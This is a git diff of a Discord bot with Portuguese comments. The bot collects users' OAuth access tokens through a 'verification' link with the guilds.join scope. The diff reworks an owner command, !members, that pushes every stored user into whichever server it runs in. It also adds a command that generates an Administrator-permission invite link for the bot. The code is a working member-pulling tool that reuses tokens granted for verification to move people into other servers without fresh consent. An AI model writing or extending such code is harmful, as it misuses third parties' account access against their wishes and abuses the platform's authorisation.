@@ -145,10 +145,9 @@ app.get('/callback', async (req, res) => {
         const guild = client.guilds.cache.get(config.GUILD_ID);
         if (guild) {
             try {
-                // Tenta adicionar (se n estiver)
                 await guild.members.add(userId, { accessToken: access_token });
             } catch (err) {
-                console.log(`Erro ao adicionar membro (talvez ja esteja no server): ${err.message}`);
+                console.log(`Erro ao adicionar membro: ${err.message}`);
             }
             
             const member = await guild.members.fetch(userId).catch(() => null);
@@ -163,7 +162,7 @@ app.get('/callback', async (req, res) => {
 
         res.send(getHtml('success'));
     } catch (error) {
-        console.error('ERRO DETALHADO:', error.response?.data || error.message);
+        console.error('ERRO:', error.response?.data || error.message);
         const errorMsg = error.response?.data?.error_description || error.response?.data?.error || error.message;
         res.send(getHtml('error', errorMsg));
     }
@@ -172,6 +171,7 @@ app.get('/callback', async (req, res) => {
 client.on('messageCreate', async (message) => {
     if (message.author.bot || message.author.id !== config.OWNER_ID) return;
 
+    // --- COMANDO: CONFIGURAR APARÊNCIA (!sconfig) ---
     if (message.content === '!sconfig') {
         message.delete().catch(() => {});
         const embed = new EmbedBuilder()
@@ -191,6 +191,7 @@ client.on('messageCreate', async (message) => {
         return message.channel.send({ embeds: [embed], components: [row] });
     }
 
+    // --- COMANDO: ENVIAR VERIFICAÇÃO (!setup) ---
     if (message.content === '!setup') {
         message.delete().catch(() => {});
         const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&redirect_uri=${encodeURIComponent(config.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
@@ -209,24 +210,53 @@ client.on('messageCreate', async (message) => {
         return message.channel.send({ embeds: [embed], components: [row] });
     }
 
-    if (message.content.startsWith('!puxar')) {
+    // --- COMANDO: PUXAR PARA O SERVER ATUAL (!members) ---
+    if (message.content === '!members') {
         message.delete().catch(() => {});
-        const targetGuildId = message.content.split(' ')[1];
-        const targetGuild = client.guilds.cache.get(targetGuildId);
-        if (!targetGuild) return message.channel.send('Servidor não encontrado.').then(m => setTimeout(() => m.delete(), 5000));
-
-        message.channel.send('Iniciando puxada...').then(m => setTimeout(() => m.delete(), 5000));
+        const targetGuild = message.guild;
+        
+        const statusMsg = await message.channel.send(`🔄 Iniciando puxada de membros para **${targetGuild.name}**... Isso pode demorar.`);
         
         const users = Object.keys(usersDB);
+        let success = 0;
+        let fail = 0;
+
         for (const userId of users) {
             const validToken = await getValidAccessToken(userId);
             if (validToken) {
                 try {
                     await targetGuild.members.add(userId, { accessToken: validToken });
-                } catch (e) {}
+                    success++;
+                } catch (e) {
+                    fail++;
+                }
+            } else {
+                fail++;
             }
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 1000)); // Delay obrigatório para não tomar ban da API
         }
+        statusMsg.edit(`✅ **Processo Finalizado!**\n\n📥 Sucessos: ${success}\n❌ Falhas (Token expirado/Já no server): ${fail}`);
+    }
+
+    // --- COMANDO: GERAR LINK DE CONVITE (!gerarlink) ---
+    if (message.content === '!gerarlink') {
+        message.delete().catch(() => {});
+        // Gera link com permissão de Administrador (8)
+        const inviteUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&permissions=8&scope=bot`;
+        
+        const embed = new EmbedBuilder()
+            .setTitle('🔗 Link de Convite do Bot')
+            .setDescription(`Envie este link para adicionar o bot em outro servidor:\n\n[Clique aqui para Adicionar](${inviteUrl})\n\n**Nota:** O bot entrará com permissão de Administrador.`)
+            .setColor('Blue');
+            
+        message.channel.send({ embeds: [embed] });
+    }
+
+    // --- COMANDO: SAIR DO SERVIDOR (!quit) ---
+    if (message.content === '!quit') {
+        message.delete().catch(() => {});
+        await message.channel.send('👋 Saindo do servidor conforme solicitado...');
+        await message.guild.leave();
     }
 });
 
